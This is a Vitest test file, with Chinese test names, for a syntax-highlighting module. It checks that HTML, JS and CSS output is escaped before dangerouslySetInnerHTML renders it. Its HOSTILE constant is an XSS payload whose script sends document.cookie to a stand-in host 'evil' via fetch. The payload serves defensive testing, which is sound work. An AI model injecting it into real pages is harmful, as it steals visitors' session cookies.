import { describe, expect, it } from 'vitest'
import { escapeHtml, highlightCode, languageOf } from '../highlight'

const HOSTILE = '<img src=x onerror=alert(1)><script>fetch("//evil?c="+document.cookie)</script>'

describe('languageOf', () => {
  it('按扩展名识别语言', () => {
    expect(languageOf('index.html')).toBe('html')
    expect(languageOf('src/app.tsx')).toBe('typescript')
    expect(languageOf('style.css')).toBe('css')
  })

  it('认不出的扩展名返回 null', () => {
    expect(languageOf('README')).toBeNull()
    expect(languageOf('data.unknownext')).toBeNull()
  })
})

describe('highlightCode', () => {
  // 组件里用 dangerouslySetInnerHTML 渲染它的输出，转义是这条路径唯一的安全边界
  it.each(['index.html', 'app.js', 'style.css'])('生成的 %s 中的恶意标签不会原样出现在 HTML 里', (file) => {
    const html = highlightCode(HOSTILE, file)
    expect(html).not.toMatch(/<img/i)
    expect(html).not.toMatch(/<script/i)
    expect(html).toContain('&lt;')
  })

  it('未知语言退回转义后的纯文本，不产生标签', () => {
    const html = highlightCode(HOSTILE, 'notes.txt')
    expect(html).toBe(escapeHtml(HOSTILE))
    expect(html).not.toContain('<')
  })

  it('真实代码会被切出 token（确实做了高亮，不只是转义）', () => {
    const html = highlightCode('<!DOCTYPE html><title>hi</title>', 'index.html')
    expect(html).toContain('hljs-')
  })
})
